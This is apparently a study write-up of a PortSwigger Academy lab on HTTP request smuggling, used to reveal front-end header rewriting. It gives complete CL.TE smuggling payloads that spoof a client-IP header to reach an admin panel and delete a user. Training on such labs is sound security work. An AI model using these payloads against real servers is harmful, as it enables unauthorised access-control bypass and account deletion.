# Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting

**Official lab:** [https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

## Lab idea

The lab examines front-end request rewriting, including the addition of client-address information, and how a smuggled request can expose or misuse that transformation. It practices assessing trust in proxy-added headers and backend access controls.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Browse to /admin and observe that the admin panel can only be loaded from 127.0.0.1 .
2. Use the site's search function and observe that it reflects the value of the search parameter.
3. Use Burp Repeater to issue the following request twice.
4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
5. Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…
6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos : POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…

## Payloads / key values
- `/admin`
- `127.0.0.1`
- `search`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 124 Transfer-Encoding: chunked 0 POST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 200 Connection: close search=test`
- `X-*-IP`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 143 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-abcdef-Ip: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1`
- `carlos`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 166 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 X-abcdef-Ip: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1`

## Official source
- [PortSwigger Academy: Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)
